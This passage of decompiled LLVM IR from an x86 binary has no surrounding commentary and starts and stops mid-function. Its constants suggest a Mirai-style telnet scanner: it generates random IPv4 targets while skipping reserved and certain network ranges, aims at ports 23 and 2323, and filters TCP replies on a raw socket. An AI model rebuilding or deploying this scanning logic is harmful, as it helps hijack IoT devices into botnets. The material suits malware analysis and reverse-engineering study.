  %v15_804ddd3 = icmp eq i32 %v3_804ddd3, %v0_804ddcd
  br i1 %v15_804ddd3, label %dec_label_pc_804e11b, label %dec_label_pc_804dddd

dec_label_pc_804dddd:                             ; preds = %.loopexit
  %v1_804dddd = add i32 %v0_804ddd3, 1812
  store i32 %v1_804dddd, i32* @ebp, align 4
  %v1_804dde4 = add i32 %v0_804ddd3, 1852
  %v2_804dde4 = inttoptr i32 %v1_804dde4 to i32*
  store i32 0, i32* %v2_804dde4, align 4
  %v0_804dfdf.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804dfdf

dec_label_pc_804ddf4:                             ; preds = %dec_label_pc_804e053
  switch i8 %v2_804e036, label %dec_label_pc_804de0f [
    i8 -84, label %dec_label_pc_804e0a0
    i8 100, label %dec_label_pc_804ddfd.dec_label_pc_804e06a_crit_edge
    i8 -87, label %dec_label_pc_804e0bb
  ]

dec_label_pc_804ddfd.dec_label_pc_804e06a_crit_edge: ; preds = %dec_label_pc_804ddf4
  %.pre = trunc i32 %v2_804e02d to i8
  br label %dec_label_pc_804e06a

dec_label_pc_804de06:                             ; preds = %dec_label_pc_804e061
  %v11_804de06 = icmp eq i8 %v2_804e036, -87
  br i1 %v11_804de06, label %dec_label_pc_804e0bb, label %dec_label_pc_804de0f

dec_label_pc_804de0f:                             ; preds = %dec_label_pc_804ddf4, %dec_label_pc_804e0b2, %dec_label_pc_804de06
  %v0_804de0f = phi i32 [ %v0_804e0b2, %dec_label_pc_804e0b2 ], [ %v5_804e02b, %dec_label_pc_804de06 ], [ %v5_804e02b, %dec_label_pc_804ddf4 ]
  %v0_804de2664 = phi i32 [ %v0_804e0a9, %dec_label_pc_804e0b2 ], [ %v2_804e02d, %dec_label_pc_804de06 ], [ %v2_804e02d, %dec_label_pc_804ddf4 ]
  %v1_804de0f = trunc i32 %v0_804de0f to i8
  %v11_804de0f = icmp eq i8 %v1_804de0f, -58
  br i1 %v11_804de0f, label %dec_label_pc_804e081, label %dec_label_pc_804de18

dec_label_pc_804de18:                             ; preds = %dec_label_pc_804e0bb, %dec_label_pc_804e078, %dec_label_pc_804de0f
  %v0_804de18 = phi i32 [ %v0_804de1871, %dec_label_pc_804e0bb ], [ %v5_804e02b, %dec_label_pc_804e078 ], [ %v0_804de0f, %dec_label_pc_804de0f ]
  %v0_804de2663 = phi i32 [ %v0_804e0bb, %dec_label_pc_804e0bb ], [ %v2_804e02d, %dec_label_pc_804e078 ], [ %v0_804de2664, %dec_label_pc_804de0f ]
  %v1_804de18 = trunc i32 %v0_804de18 to i8
  %tmp289 = icmp ult i8 %v1_804de18, -32
  br i1 %tmp289, label %dec_label_pc_804de21, label %dec_label_pc_804e020.preheader

dec_label_pc_804de21:                             ; preds = %dec_label_pc_804e06a, %dec_label_pc_804e081, %dec_label_pc_804e0a0.dec_label_pc_804de21_crit_edge, %dec_label_pc_804de18
  %v0_804dee4 = phi i32 [ %v0_804e0a9, %dec_label_pc_804e0a0.dec_label_pc_804de21_crit_edge ], [ %v0_804de2663, %dec_label_pc_804de18 ], [ %v0_804e08a, %dec_label_pc_804e081 ], [ %v2_804e02d, %dec_label_pc_804e06a ]
  %v0_804def2 = phi i32 [ %v0_804de21.pre, %dec_label_pc_804e0a0.dec_label_pc_804de21_crit_edge ], [ %v0_804de18, %dec_label_pc_804de18 ], [ %v0_804de2160, %dec_label_pc_804e081 ], [ %v5_804e02b, %dec_label_pc_804e06a ]
  %v1_804de21 = trunc i32 %v0_804def2 to i8
  %v10_804de21 = icmp eq i8 %v1_804de21, 106
  %tmp290 = and i32 %v0_804dee4, 252
  %switch = icmp eq i32 %tmp290, 184
  %or.cond182 = and i1 %switch, %v10_804de21
  br i1 %or.cond182, label %dec_label_pc_804e020.preheader, label %dec_label_pc_804de4a

dec_label_pc_804de4a:                             ; preds = %dec_label_pc_804de21
  switch i8 %v1_804de21, label %dec_label_pc_804de6e [
    i8 -106, label %dec_label_pc_804e0c9
    i8 49, label %dec_label_pc_804e0e9
    i8 -78, label %dec_label_pc_804e0db
    i8 -96, label %dec_label_pc_804e0fb
  ]

dec_label_pc_804de6e:                             ; preds = %dec_label_pc_804e0e9, %dec_label_pc_804e0c9, %dec_label_pc_804de4a, %dec_label_pc_804e0fb, %dec_label_pc_804e0db
  %v1_804de6e = add i32 %v0_804def2, -6
  store i32 %v1_804de6e, i32* %eax.global-to-local, align 4
  %v1_804de71 = trunc i32 %v1_804de6e to i8
  %tmp291 = or i8 %v1_804de71, 1
  %tmp292 = icmp eq i8 %tmp291, 1
  br i1 %tmp292, label %dec_label_pc_804e020.preheader, label %switch.early.test

switch.early.test:                                ; preds = %dec_label_pc_804de6e
  switch i8 %v1_804de21, label %dec_label_pc_804dedc [
    i8 -41, label %dec_label_pc_804e020.preheader
    i8 -42, label %dec_label_pc_804e020.preheader
    i8 55, label %dec_label_pc_804e020.preheader
    i8 33, label %dec_label_pc_804e020.preheader
    i8 30, label %dec_label_pc_804e020.preheader
    i8 29, label %dec_label_pc_804e020.preheader
    i8 28, label %dec_label_pc_804e020.preheader
    i8 26, label %dec_label_pc_804e020.preheader
    i8 22, label %dec_label_pc_804e020.preheader
    i8 21, label %dec_label_pc_804e020.preheader
    i8 11, label %dec_label_pc_804e020.preheader
  ]

dec_label_pc_804dedc:                             ; preds = %switch.early.test
  %v0_804dede = load i32, i32* @edx, align 4
  store i16 0, i16* bitcast (i32* @global_var_805310a.10 to i16*), align 4
  %v1_804dee4 = mul i32 %v0_804dee4, 65536
  %v2_804deef = and i32 %v1_804dee4, 16711680
  %v2_804def2 = mul i32 %v0_804def2, 16777216
  %v1_804dede = mul i32 %v0_804dede, 256
  %v2_804def8 = or i32 %v2_804deef, %v2_804def2
  %v0_804defa = load i32, i32* @edi, align 4
  %v1_804defc = urem i32 %v0_804defa, 256
  store i32 %v1_804defc, i32* %eax.global-to-local, align 4
  %v2_804df01 = or i32 %v1_804defc, %v2_804def8
  store i32 %v2_804df01, i32* %ecx.global-to-local, align 4
  %v2_804df03 = or i32 %v1_804defc, %v1_804dede
  %v1_804df05 = load i32, i32* @esp, align 4
  %v2_804df05 = add i32 %v1_804df05, -4
  %v3_804df05 = inttoptr i32 %v2_804df05 to i32*
  store i32 %v2_804df01, i32* %v3_804df05, align 4
  %v1_804df06 = trunc i32 %v2_804df03 to i16
  %v2_804df06 = call i16 @llvm.bswap.i16(i16 %v1_804df06)
  %v3_804df06 = zext i16 %v2_804df06 to i32
  %v1_804df0a = udiv i32 %v2_804def8, 65536
  %v2_804df0a = mul nuw i32 %v3_804df06, 65536
  %v1_804df0d = trunc i32 %v1_804df0a to i16
  %v2_804df0d = call i16 @llvm.bswap.i16(i16 %v1_804df0d)
  %v3_804df0d = zext i16 %v2_804df0d to i32
  %v6_804df0d = or i32 %v2_804df0a, %v3_804df0d
  store i32 %v6_804df0d, i32* %edx.global-to-local, align 4
  %v0_804df11 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804df11 = add i32 %v1_804df05, -8
  %v3_804df11 = inttoptr i32 %v2_804df11 to i32*
  store i32 %v0_804df11, i32* %v3_804df11, align 4
  %v0_804df12 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804df12, i32* @global_var_8053110.11, align 16
  %v1_804df18 = add i32 %v1_804df05, -12
  %v2_804df18 = inttoptr i32 %v1_804df18 to i32*
  store i32 20, i32* %v2_804df18, align 4
  %v1_804df1a = add i32 %v1_804df05, -16
  %v2_804df1a = inttoptr i32 %v1_804df1a to i32*
  store i32 ptrtoint (i32* @global_var_8053100.12 to i32), i32* %v2_804df1a, align 4
  %v0_804df1f = call i32 @function_804bd90()
  %v1_804df1f = trunc i32 %v0_804df1f to i16
  store i32 %v0_804df1f, i32* %eax.global-to-local, align 4
  %v0_804df24 = load i32, i32* @esp, align 4
  %v1_804df24 = add i32 %v0_804df24, 1868
  %v2_804df24 = inttoptr i32 %v1_804df24 to i32*
  %v3_804df24 = load i32, i32* %v2_804df24, align 4
  store i16 %v1_804df1f, i16* bitcast (i32* @global_var_805310a.10 to i16*), align 4
  store i32 10, i32* %ecx.global-to-local, align 4
  %v2_804df3a = ashr i32 %v3_804df24, 31
  %v2_804df40 = zext i32 %v3_804df24 to i64
  %v4_804df40 = zext i32 %v2_804df3a to i64
  %v5_804df40 = mul nuw i64 %v4_804df40, 4294967296
  %v6_804df40 = or i64 %v5_804df40, %v2_804df40
  %v10_804df40 = srem i64 %v6_804df40, 10
  %v11_804df40 = trunc i64 %v10_804df40 to i32
  store i32 %v11_804df40, i32* %edx.global-to-local, align 4
  %v1_804df42 = icmp eq i32 %v11_804df40, 0
  %v1_804df44 = icmp eq i1 %v1_804df42, false
  %. = select i1 %v1_804df44, i16 5888, i16 4873
  store i16 %., i16* @global_var_8053116.13, align 2
  %v0_804df53 = load i32, i32* @global_var_8053110.11, align 16
  store i32 %v0_804df53, i32* %eax.global-to-local, align 4
  %v1_804df58 = add i32 %v0_804df24, 12
  %v2_804df58 = inttoptr i32 %v1_804df58 to i32*
  store i32 20, i32* %v2_804df58, align 4
  %v0_804df5a = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_804df5a, i32* @global_var_8053118.14, align 8
  %v1_804df5f = add i32 %v0_804df24, 8
  %v2_804df5f = inttoptr i32 %v1_804df5f to i32*
  store i32 5120, i32* %v2_804df5f, align 4
  store i16 0, i16* bitcast (i32* @global_var_8053124.15 to i16*), align 4
  %v1_804df6d = add i32 %v0_804df24, 4
  %v2_804df6d = inttoptr i32 %v1_804df6d to i32*
  store i32 ptrtoint (i32* @global_var_8053114.16 to i32), i32* %v2_804df6d, align 4
  %v2_804df72 = inttoptr i32 %v0_804df24 to i32*
  store i32 ptrtoint (i32* @global_var_8053100.12 to i32), i32* %v2_804df72, align 4
  %v0_804df77 = call i32 @function_804bde0()
  %v1_804df77 = trunc i32 %v0_804df77 to i16
  store i16 %v1_804df77, i16* bitcast (i32* @global_var_8053124.15 to i16*), align 4
  %v0_804df82 = load i32, i32* @global_var_8053110.11, align 16
  store i32 %v0_804df82, i32* %eax.global-to-local, align 4
  %v1_804df87 = load i32, i32* @esp, align 4
  %v2_804df87 = add i32 %v1_804df87, 1832
  %v3_804df87 = inttoptr i32 %v2_804df87 to i32*
  store i32 %v0_804df82, i32* %v3_804df87, align 4
  %v0_804df8e = load i16, i16* @global_var_8053116.13, align 2
  %v1_804df8e = zext i16 %v0_804df8e to i32
  %v2_804df8e = load i32, i32* %eax.global-to-local, align 4
  %v3_804df8e = and i32 %v2_804df8e, -65536
  %v4_804df8e = or i32 %v3_804df8e, %v1_804df8e
  store i32 %v4_804df8e, i32* %eax.global-to-local, align 4
  %v0_804df94 = load i32, i32* @esp, align 4
  %v1_804df94 = add i32 %v0_804df94, 1828
  %v2_804df94 = inttoptr i32 %v1_804df94 to i16*
  store i16 2, i16* %v2_804df94, align 2
  %v0_804df9e = load i32, i32* %eax.global-to-local, align 4
  %v1_804df9e = trunc i32 %v0_804df9e to i16
  %v2_804df9e = load i32, i32* @esp, align 4
  %v3_804df9e = add i32 %v2_804df9e, 1830
  %v4_804df9e = inttoptr i32 %v3_804df9e to i16*
  store i16 %v1_804df9e, i16* %v4_804df9e, align 2
  %v0_804dfa6 = load i32, i32* @esp, align 4
  %v1_804dfa6 = inttoptr i32 %v0_804dfa6 to i32*
  %v3_804dfa6 = add i32 %v0_804dfa6, 4
  %v0_804dfa7 = load i32, i32* @global_var_805317c.17, align 4
  store i32 %v0_804dfa7, i32* %eax.global-to-local, align 4
  %v1_804dfac = inttoptr i32 %v3_804dfa6 to i32*
  %v2_804dfac = load i32, i32* %v1_804dfac, align 4
  store i32 %v2_804dfac, i32* %edx.global-to-local, align 4
  store i32 16, i32* %v1_804dfac, align 4
  %v0_804dfaf = load i32, i32* @ebp, align 4
  store i32 %v0_804dfaf, i32* %v1_804dfa6, align 4
  %v1_804dfb0 = add i32 %v0_804dfa6, -4
  %v2_804dfb0 = inttoptr i32 %v1_804dfb0 to i32*
  store i32 16384, i32* %v2_804dfb0, align 4
  %v1_804dfb5 = add i32 %v0_804dfa6, -8
  %v2_804dfb5 = inttoptr i32 %v1_804dfb5 to i32*
  store i32 40, i32* %v2_804dfb5, align 4
  %v1_804dfb7 = add i32 %v0_804dfa6, -12
  %v2_804dfb7 = inttoptr i32 %v1_804dfb7 to i32*
  store i32 ptrtoint (i32* @global_var_8053100.12 to i32), i32* %v2_804dfb7, align 4
  %v0_804dfbc = load i32, i32* %eax.global-to-local, align 4
  %v2_804dfbc = add i32 %v0_804dfa6, -16
  %v3_804dfbc = inttoptr i32 %v2_804dfbc to i32*
  store i32 %v0_804dfbc, i32* %v3_804dfbc, align 4
  %v0_804dfbd = call i32 @function_8050219()
  store i32 %v0_804dfbd, i32* %eax.global-to-local, align 4
  %v0_804dfc2 = load i32, i32* @esp, align 4
  %v1_804dfc2 = add i32 %v0_804dfc2, 1884
  %v2_804dfc2 = inttoptr i32 %v1_804dfc2 to i32*
  %v3_804dfc2 = load i32, i32* %v2_804dfc2, align 4
  %v1_804dfc9 = add i32 %v3_804dfc2, 1
  store i32 %v1_804dfc9, i32* %eax.global-to-local, align 4
  store i32 %v1_804dfc9, i32* %v2_804dfc2, align 4
  %v0_804dfd1 = load i32, i32* @esp, align 4
  %v1_804dfd1 = add i32 %v0_804dfd1, 32
  %v0_804dfd4 = load i32, i32* %eax.global-to-local, align 4
  %v1_804dfd4 = add i32 %v0_804dfd4, -383
  %v6_804dfd4 = sub i32 382, %v0_804dfd4
  %v7_804dfd4 = and i32 %v6_804dfd4, %v0_804dfd4
  %v8_804dfd4 = icmp slt i32 %v7_804dfd4, 0
  %v9_804dfd4 = icmp eq i32 %v1_804dfd4, 0
  %v10_804dfd4 = icmp slt i32 %v1_804dfd4, 0
  %v3_804dfd9 = icmp eq i1 %v10_804dfd4, %v8_804dfd4
  %v4_804dfd9 = icmp eq i1 %v9_804dfd4, false
  %v5_804dfd9 = and i1 %v4_804dfd9, %v3_804dfd9
  br i1 %v5_804dfd9, label %dec_label_pc_804e117, label %dec_label_pc_804dfdf

dec_label_pc_804dfdf:                             ; preds = %dec_label_pc_804dedc, %dec_label_pc_804dddd
  %v0_804dfdf = phi i32 [ %v1_804dfd1, %dec_label_pc_804dedc ], [ %v0_804dfdf.pre, %dec_label_pc_804dddd ]
  %v1_804dfdf = add i32 %v0_804dfdf, 1812
  %v2_804dfdf = inttoptr i32 %v1_804dfdf to i32*
  store i32 0, i32* %v2_804dfdf, align 4
  %v0_804dfea = load i32, i32* @esp, align 4
  %v1_804dfea = add i32 %v0_804dfea, 1816
  %v2_804dfea = inttoptr i32 %v1_804dfea to i32*
  store i32 0, i32* %v2_804dfea, align 4
  %v0_804dff5 = load i32, i32* @esp, align 4
  %v1_804dff5 = add i32 %v0_804dff5, 1820
  %v2_804dff5 = inttoptr i32 %v1_804dff5 to i32*
  store i32 0, i32* %v2_804dff5, align 4
  %v0_804e000 = load i32, i32* @esp, align 4
  %v1_804e000 = add i32 %v0_804e000, 1824
  %v2_804e000 = inttoptr i32 %v1_804e000 to i32*
  store i32 0, i32* %v2_804e000, align 4
  %v0_804e00b = call i32 @function_804d6b0()
  %v1_804e00b = trunc i32 %v0_804e00b to i16
  store i16 %v1_804e00b, i16* bitcast (i32* @global_var_8053104.18 to i16*), align 4
  %v0_804e016 = load i32, i32* @global_var_805315c.19, align 4
  store i32 %v0_804e016, i32* %eax.global-to-local, align 4
  store i32 %v0_804e016, i32* @global_var_805310c.20, align 4
  br label %dec_label_pc_804e020.preheader

dec_label_pc_804e020.preheader:                   ; preds = %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %dec_label_pc_804de6e, %dec_label_pc_804de21, %dec_label_pc_804e081, %dec_label_pc_804dfdf, %dec_label_pc_804e0a9, %dec_label_pc_804e0c9, %dec_label_pc_804e0e9, %dec_label_pc_804de18, %dec_label_pc_804e0bb, %dec_label_pc_804e0db, %dec_label_pc_804e0fb
  br label %dec_label_pc_804e020

dec_label_pc_804e020:                             ; preds = %switch.early.test288, %switch.early.test288, %dec_label_pc_804e042, %dec_label_pc_804e020, %dec_label_pc_804e020, %dec_label_pc_804e020, %dec_label_pc_804e073, %dec_label_pc_804e05c, %dec_label_pc_804e020.preheader
  %v0_804e020 = call i32 @function_804d6b0()
  store i32 %v0_804e020, i32* %eax.global-to-local, align 4
  %sext = mul i32 %v0_804e020, 65536
  %v1_804e025 = sdiv i32 %sext, 65536
  %v2_804e02b = urem i32 %v0_804e020, 256
  %v3_804e02b = load i32, i32* @ecx, align 4
  %v4_804e02b = and i32 %v3_804e02b, -256
  %v5_804e02b = or i32 %v4_804e02b, %v2_804e02b
  store i32 %v5_804e02b, i32* @ecx, align 4
  %v2_804e02d = udiv i32 %v1_804e025, 256
  store i32 %v2_804e02d, i32* @ebx, align 4
  %v2_804e030 = udiv i32 %v1_804e025, 65536
  store i32 %v2_804e030, i32* @edx, align 4
  %v2_804e033 = udiv i32 %v1_804e025, 16777216
  store i32 %v2_804e033, i32* @edi, align 4
  %v2_804e036 = trunc i32 %v0_804e020 to i8
  switch i8 %v2_804e036, label %dec_label_pc_804e042 [
    i8 127, label %dec_label_pc_804e020
    i8 0, label %dec_label_pc_804e020
    i8 3, label %dec_label_pc_804e020
  ]

dec_label_pc_804e042:                             ; preds = %dec_label_pc_804e020
  %v2_804e042 = add nsw i32 %v1_804e025, -15
  store i32 %v2_804e042, i32* %eax.global-to-local, align 4
  %v1_804e045 = trunc i32 %v2_804e042 to i8
  %tmp293 = or i8 %v1_804e045, 1
  %tmp294 = icmp eq i8 %tmp293, 1
  br i1 %tmp294, label %dec_label_pc_804e020, label %switch.early.test288

switch.early.test288:                             ; preds = %dec_label_pc_804e042
  switch i8 %v2_804e036, label %dec_label_pc_804e053 [
    i8 56, label %dec_label_pc_804e020
    i8 10, label %dec_label_pc_804e020
  ]

dec_label_pc_804e053:                             ; preds = %switch.early.test288
  %v8_804e053 = icmp eq i8 %v2_804e036, -64
  %v1_804e056 = icmp eq i1 %v8_804e053, false
  br i1 %v1_804e056, label %dec_label_pc_804ddf4, label %dec_label_pc_804e05c

dec_label_pc_804e05c:                             ; preds = %dec_label_pc_804e053
  %v1_804e05c = trunc i32 %v2_804e02d to i8
  %v11_804e05c = icmp eq i8 %v1_804e05c, -88
  br i1 %v11_804e05c, label %dec_label_pc_804e020, label %dec_label_pc_804e061

dec_label_pc_804e061:                             ; preds = %dec_label_pc_804e05c
  %v10_804e061 = icmp eq i8 %v2_804e036, 100
  %v1_804e064 = icmp eq i1 %v10_804e061, false
  br i1 %v1_804e064, label %dec_label_pc_804de06, label %dec_label_pc_804e06a

dec_label_pc_804e06a:                             ; preds = %dec_label_pc_804ddfd.dec_label_pc_804e06a_crit_edge, %dec_label_pc_804e061
  %v1_804e06a.pre-phi = phi i8 [ %.pre, %dec_label_pc_804ddfd.dec_label_pc_804e06a_crit_edge ], [ %v1_804e05c, %dec_label_pc_804e061 ]
  %tmp295 = icmp ult i8 %v1_804e06a.pre-phi, 64
  br i1 %tmp295, label %dec_label_pc_804de21, label %dec_label_pc_804e073

dec_label_pc_804e073:                             ; preds = %dec_label_pc_804e06a
  %tmp296 = icmp ult i8 %v1_804e06a.pre-phi, 127
  br i1 %tmp296, label %dec_label_pc_804e020, label %dec_label_pc_804e078

dec_label_pc_804e078:                             ; preds = %dec_label_pc_804e073
  %v11_804e078 = icmp eq i8 %v2_804e036, -58
  %v1_804e07b = icmp eq i1 %v11_804e078, false
  br i1 %v1_804e07b, label %dec_label_pc_804de18, label %dec_label_pc_804e081

dec_label_pc_804e081:                             ; preds = %dec_label_pc_804e078, %dec_label_pc_804de0f
  %v0_804e08a = phi i32 [ %v2_804e02d, %dec_label_pc_804e078 ], [ %v0_804de2664, %dec_label_pc_804de0f ]
  %v0_804de2160 = phi i32 [ %v5_804e02b, %dec_label_pc_804e078 ], [ %v0_804de0f, %dec_label_pc_804de0f ]
  %v1_804e081 = trunc i32 %v0_804e08a to i8
  %tmp297 = icmp ugt i8 %v1_804e081, 17
  %tmp298 = or i8 %v1_804e081, 1
  %tmp299 = icmp eq i8 %tmp298, 19
  %or.cond162 = and i1 %tmp297, %tmp299
  br i1 %or.cond162, label %dec_label_pc_804e020.preheader, label %dec_label_pc_804de21

dec_label_pc_804e094:                             ; preds = %dec_label_pc_804eec7
  store i32 0, i32* %v2_804e097, align 4
  %v1_804e099 = call i32 @function_80515d3(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804e099, i32* %eax.global-to-local, align 4
  %v0_804e0a0.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e0a0

dec_label_pc_804e0a0:                             ; preds = %dec_label_pc_804ddf4, %dec_label_pc_804e094
  %v0_804e0a9 = phi i32 [ %v0_804e0a0.pre, %dec_label_pc_804e094 ], [ %v2_804e02d, %dec_label_pc_804ddf4 ]
  %v1_804e0a0 = trunc i32 %v0_804e0a9 to i8
  %tmp300 = icmp ult i8 %v1_804e0a0, 16
  br i1 %tmp300, label %dec_label_pc_804e0a0.dec_label_pc_804de21_crit_edge, label %dec_label_pc_804e0a9

dec_label_pc_804e0a0.dec_label_pc_804de21_crit_edge: ; preds = %dec_label_pc_804e0a0
  %v0_804de21.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804de21

dec_label_pc_804e0a9:                             ; preds = %dec_label_pc_804e0a0
  %tmp301 = icmp ult i8 %v1_804e0a0, 32
  br i1 %tmp301, label %dec_label_pc_804e020.preheader, label %dec_label_pc_804e0b2

dec_label_pc_804e0b2:                             ; preds = %dec_label_pc_804e0a9
  %v0_804e0b2 = load i32, i32* @ecx, align 4
  %v1_804e0b2 = trunc i32 %v0_804e0b2 to i8
  %v11_804e0b2 = icmp eq i8 %v1_804e0b2, -87
  %v1_804e0b5 = icmp eq i1 %v11_804e0b2, false
  br i1 %v1_804e0b5, label %dec_label_pc_804de0f, label %dec_label_pc_804e0bb

dec_label_pc_804e0bb:                             ; preds = %dec_label_pc_804ddf4, %dec_label_pc_804e0b2, %dec_label_pc_804de06
  %v0_804de1871 = phi i32 [ %v0_804e0b2, %dec_label_pc_804e0b2 ], [ %v5_804e02b, %dec_label_pc_804de06 ], [ %v5_804e02b, %dec_label_pc_804ddf4 ]
  %v0_804e0bb = phi i32 [ %v0_804e0a9, %dec_label_pc_804e0b2 ], [ %v2_804e02d, %dec_label_pc_804de06 ], [ %v2_804e02d, %dec_label_pc_804ddf4 ]
  %v1_804e0bb = trunc i32 %v0_804e0bb to i8
  %v11_804e0bb = icmp eq i8 %v1_804e0bb, -1
  %v1_804e0be = icmp eq i1 %v11_804e0bb, false
  br i1 %v1_804e0be, label %dec_label_pc_804de18, label %dec_label_pc_804e020.preheader

dec_label_pc_804e0c9:                             ; preds = %dec_label_pc_804de4a
  %v1_804e0c9 = trunc i32 %v0_804dee4 to i8
  %v10_804e0c9 = icmp eq i8 %v1_804e0c9, 31
  br i1 %v10_804e0c9, label %dec_label_pc_804e020.preheader, label %dec_label_pc_804de6e

dec_label_pc_804e0db:                             ; preds = %dec_label_pc_804de4a
  %.pre127 = trunc i32 %v0_804dee4 to i8
  %v10_804e0db = icmp eq i8 %.pre127, 62
  %v1_804e0de = icmp eq i1 %v10_804e0db, false
  br i1 %v1_804e0de, label %dec_label_pc_804de6e, label %dec_label_pc_804e020.preheader

dec_label_pc_804e0e9:                             ; preds = %dec_label_pc_804de4a
  %v1_804e0e9 = trunc i32 %v0_804dee4 to i8
  %v10_804e0e9 = icmp eq i8 %v1_804e0e9, 51
  br i1 %v10_804e0e9, label %dec_label_pc_804e020.preheader, label %dec_label_pc_804de6e

dec_label_pc_804e0fb:                             ; preds = %dec_label_pc_804de4a
  %.pre126 = trunc i32 %v0_804dee4 to i8
  %v10_804e0fb = icmp eq i8 %.pre126, 13
  %v1_804e0fe = icmp eq i1 %v10_804e0fb, false
  br i1 %v1_804e0fe, label %dec_label_pc_804de6e, label %dec_label_pc_804e020.preheader

dec_label_pc_804e117:                             ; preds = %dec_label_pc_804dedc
  %v0_804e117 = load i32, i32* @esi, align 4
  %v2_804e117 = add i32 %v0_804dfd1, 48
  %v3_804e117 = inttoptr i32 %v2_804e117 to i32*
  store i32 %v0_804e117, i32* %v3_804e117, align 4
  br label %dec_label_pc_804e11b

dec_label_pc_804e11b:                             ; preds = %.loopexit, %dec_label_pc_804e117
  %v1_804e11b = call i32 @function_804ffeb(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804e11b, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_804e122 = load i32, i32* @esp, align 4
  %v2_804e122 = add i32 %v1_804e122, 24
  %v3_804e122 = inttoptr i32 %v2_804e122 to i32*
  store i32 %v1_804e11b, i32* %v3_804e122, align 4
  br label %dec_label_pc_804e126

dec_label_pc_804e126:                             ; preds = %dec_label_pc_804e181, %dec_label_pc_804e1c3, %dec_label_pc_804e1bb, %dec_label_pc_804e1b3, %dec_label_pc_804e19f, %dec_label_pc_804e193, %dec_label_pc_804e17a, %dec_label_pc_804e16e, %dec_label_pc_804e169, %dec_label_pc_804e225, %dec_label_pc_804e11b
  %v0_804e126 = load i32, i32* @esp, align 4
  %v1_804e126 = add i32 %v0_804e126, 24
  %v2_804e126 = inttoptr i32 %v1_804e126 to i32*
  %v3_804e126 = load i32, i32* %v2_804e126, align 4
  store i32 %v3_804e126, i32* %eax.global-to-local, align 4
  %v1_804e12a = inttoptr i32 %v3_804e126 to i32*
  store i32 0, i32* %v1_804e12a, align 4
  %v0_804e130 = load i32, i32* @edi, align 4
  %v1_804e130 = load i32, i32* @esp, align 4
  %v2_804e130 = add i32 %v1_804e130, -4
  %v3_804e130 = inttoptr i32 %v2_804e130 to i32*
  store i32 %v0_804e130, i32* %v3_804e130, align 4
  %v0_804e131 = load i32, i32* @edi, align 4
  %v2_804e131 = add i32 %v1_804e130, -8
  %v3_804e131 = inttoptr i32 %v2_804e131 to i32*
  store i32 %v0_804e131, i32* %v3_804e131, align 4
  %v1_804e132 = add i32 %v1_804e130, -12
  %v2_804e132 = inttoptr i32 %v1_804e132 to i32*
  store i32 0, i32* %v2_804e132, align 4
  %v1_804e134 = add i32 %v1_804e130, -16
  %v2_804e134 = inttoptr i32 %v1_804e134 to i32*
  store i32 0, i32* %v2_804e134, align 4
  %v1_804e136 = add i32 %v1_804e130, -20
  %v2_804e136 = inttoptr i32 %v1_804e136 to i32*
  store i32 16384, i32* %v2_804e136, align 4
  %v1_804e13b = add i32 %v1_804e130, -24
  %v2_804e13b = inttoptr i32 %v1_804e13b to i32*
  store i32 1514, i32* %v2_804e13b, align 4
  %v0_804e140 = load i32, i32* @global_var_805317c.17, align 4
  store i32 %v0_804e140, i32* %esi.global-to-local, align 4
  %v1_804e146 = add i32 %v1_804e130, 42
  store i32 %v1_804e146, i32* %edx.global-to-local, align 4
  %v2_804e14a = add i32 %v1_804e130, -28
  %v3_804e14a = inttoptr i32 %v2_804e14a to i32*
  store i32 %v1_804e146, i32* %v3_804e14a, align 4
  %v0_804e14b = load i32, i32* %esi.global-to-local, align 4
  %v2_804e14b = add i32 %v1_804e130, -32
  %v3_804e14b = inttoptr i32 %v2_804e14b to i32*
  store i32 %v0_804e14b, i32* %v3_804e14b, align 4
  %v0_804e14c = call i32 @function_80501a3()
  store i32 %v0_804e14c, i32* %eax.global-to-local, align 4
  %v0_804e151 = load i32, i32* @esp, align 4
  %tmp = icmp slt i32 %v0_804e14c, 1
  br i1 %tmp, label %dec_label_pc_804e236, label %dec_label_pc_804e15c

dec_label_pc_804e15c:                             ; preds = %dec_label_pc_804e126
  %v1_804e15c = add i32 %v0_804e151, 56
  %v2_804e15c = inttoptr i32 %v1_804e15c to i32*
  %v3_804e15c = load i32, i32* %v2_804e15c, align 4
  store i32 %v3_804e15c, i32* %ecx.global-to-local, align 4
  %v1_804e160 = inttoptr i32 %v3_804e15c to i32*
  %v2_804e160 = load i32, i32* %v1_804e160, align 4
  %v11_804e160 = icmp eq i32 %v2_804e160, 11
  br i1 %v11_804e160, label %dec_label_pc_804e236, label %dec_label_pc_804e169

dec_label_pc_804e169:                             ; preds = %dec_label_pc_804e15c
  %tmp302 = icmp ult i32 %v0_804e14c, 40
  br i1 %tmp302, label %dec_label_pc_804e126, label %dec_label_pc_804e16e

dec_label_pc_804e16e:                             ; preds = %dec_label_pc_804e169
  %v1_804e16e = add i32 %v0_804e151, 90
  %v2_804e16e = inttoptr i32 %v1_804e16e to i32*
  %v3_804e16e = load i32, i32* %v2_804e16e, align 4
  store i32 %v3_804e16e, i32* %eax.global-to-local, align 4
  %v1_804e172 = load i32, i32* @global_var_805315c.19, align 4
  %v12_804e172 = icmp eq i32 %v3_804e16e, %v1_804e172
  %v1_804e178 = icmp eq i1 %v12_804e172, false
  br i1 %v1_804e178, label %dec_label_pc_804e126, label %dec_label_pc_804e17a

dec_label_pc_804e17a:                             ; preds = %dec_label_pc_804e16e
  %v1_804e17a = add i32 %v0_804e151, 83
  %v2_804e17a = inttoptr i32 %v1_804e17a to i8*
  %v3_804e17a = load i8, i8* %v2_804e17a, align 1
  %v12_804e17a = icmp eq i8 %v3_804e17a, 6
  %v1_804e17f = icmp eq i1 %v12_804e17a, false
  br i1 %v1_804e17f, label %dec_label_pc_804e126, label %dec_label_pc_804e181

dec_label_pc_804e181:                             ; preds = %dec_label_pc_804e17a
  %v1_804e181 = add i32 %v0_804e151, 94
  %v2_804e181 = inttoptr i32 %v1_804e181 to i32*
  %v3_804e181 = load i32, i32* %v2_804e181, align 4
